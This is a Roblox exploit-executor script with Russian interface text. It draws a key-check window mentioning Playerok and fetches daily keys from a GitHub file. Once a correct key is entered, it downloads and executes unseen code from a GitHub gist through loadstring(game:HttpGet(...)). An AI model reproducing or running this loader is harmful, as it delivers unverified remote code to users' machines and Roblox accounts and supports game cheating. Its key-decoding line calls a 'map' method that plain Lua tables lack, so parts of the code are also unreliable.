local T=game:GetService("TweenService")
local R=game:GetService("RunService")
local C=game:GetService("CoreGui")
local H=game:GetService("HttpService")

local old=C:FindFirstChild("PlayerokKeyGui")
if old then old:Destroy() end

local url="https://raw.githubusercontent.com/RobloxScriptKey/MilediKeys-/main/MILEDI-keys.json"
local ok,res=pcall(function() return game:HttpGet(url) end)
local keys={}
if ok then keys=H:JSONDecode(res) else warn("Не удалось загрузить ключи") end

local today=os.date("%Y-%m-%d")
local tKey=keys[today]
local vKey=nil
if tKey then vKey=table.concat(tKey:map(function(v)return string.char(v)end)) end

local g=Instance.new("ScreenGui")
g.Name="PlayerokKeyGui"
g.ResetOnSpawn=false
g.Parent=C

local f=Instance.new("Frame",g)
f.Size=UDim2.new(0,0,0,0)
f.Position=UDim2.new(0.5,0,0.4,0)
f.AnchorPoint=Vector2.new(0.5,0.5)
f.BackgroundColor3=Color3.fromRGB(120,140,255)
Instance.new("UICorner",f).CornerRadius=UDim.new(0,20)

local grad=Instance.new("UIGradient",f)
grad.Color=ColorSequence.new{
    ColorSequenceKeypoint.new(0,Color3.fromRGB(120,140,255)),
    ColorSequenceKeypoint.new(1,Color3.fromRGB(200,220,255))
}
grad.Rotation=45

local t=Instance.new("TextLabel",f)
t.Size=UDim2.new(1,-20,0,40)
t.Position=UDim2.new(0,10,0,60)
t.BackgroundTransparency=1
t.Text="🔐 Введите ключ от Playerok"
t.TextColor3=Color3.new(1,1,1)
t.Font=Enum.Font.GothamBold
t.TextSize=22

local b=Instance.new("TextBox",f)
b.Size=UDim2.new(0.8,0,0,36)
b.Position=UDim2.new(0.1,0,0,110)
b.PlaceholderText="Вставьте ключ..."
b.Font=Enum.Font.Gotham
b.TextSize=20
b.TextColor3=Color3.fromRGB(50,50,50)
b.BackgroundColor3=Color3.fromRGB(230,230,255)
Instance.new("UICorner",b).CornerRadius=UDim.new(0,12)

local btn=Instance.new("TextButton",f)
btn.Size=UDim2.new(0.8,0,0,40)
btn.Position=UDim2.new(0.1,0,0,160)
btn.BackgroundColor3=Color3.fromRGB(160,200,255)
btn.Font=Enum.Font.GothamBold
btn.TextSize=20
btn.TextColor3=Color3.fromRGB(30,30,30)
btn.Text="Проверить"
Instance.new("UICorner",btn).CornerRadius=UDim.new(0,12)

local fb=Instance.new("TextLabel",f)
fb.Size=UDim2.new(1,0,0,20)
fb.Position=UDim2.new(0,0,0,145)
fb.BackgroundTransparency=1
fb.Text=""
fb.TextColor3=Color3.new(1,1,1)
fb.Font=Enum.Font.Gotham
fb.TextSize=18

local pbBG=Instance.new("Frame",f)
pbBG.Size=UDim2.new(0.8,0,0,20)
pbBG.Position=UDim2.new(0.1,0,0,260)
pbBG.BackgroundColor3=Color3.fromRGB(200,200,255)
Instance.new("UICorner",pbBG).CornerRadius=UDim.new(0,10)

local pb=Instance.new("Frame",pbBG)
pb.Size=UDim2.new(0,0,1,0)
pb.BackgroundColor3=Color3.fromRGB(30,200,30)
Instance.new("UICorner",pb).CornerRadius=UDim.new(0,10)

local function tweenIn(inst,dur,target)
    T:Create(inst,TweenInfo.new(dur,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{Size=target}):Play()
end
tweenIn(f,0.5,UDim2.new(0,400,0,320))

local function pulse(btn)
    T:Create(btn,TweenInfo.new(0.5,Enum.EasingStyle.Sine,Enum.EasingDirection.InOut,-1,true),{Size=UDim2.new(0.82,0,0,42)}):Play()
end
pulse(btn)

local function fillAndLoad()
    local dur=2
    local start=tick()
    local conn
    conn=R.RenderStepped:Connect(function()
        local elapsed=tick()-start
        local pct=math.clamp(elapsed/dur,0,1)
        pb.Size=UDim2.new(pct,0,1,0)
        if pct>=1 then
            conn:Disconnect()
            g:Destroy()
            loadstring(game:HttpGet("https://gist.githubusercontent.com/UCT-hub/5b11d10386f1b8ce08feb803861e0b79/raw/b2917b398d4b0cc80fb2aca73a3137ba494ebcf0/gistfile1.txt"))()
        end
    end)
end

btn.MouseButton1Click:Connect(function()
    local input=b.Text:match("^%s*(.-)%s*$")
    if not vKey then
        fb.Text="⚠️ Ключ на сегодня не найден"
        fb.TextColor3=Color3.fromRGB(255,170,0)
    elseif input==vKey then
        fb.Text="✅ Ключ верный, загружаем..."
        fb.TextColor3=Color3.fromRGB(30,200,30)
        fillAndLoad()
    else
        fb.Text="❌ Неверный ключ"
        fb.TextColor3=Color3.fromRGB(200,40,40)
    end
end)
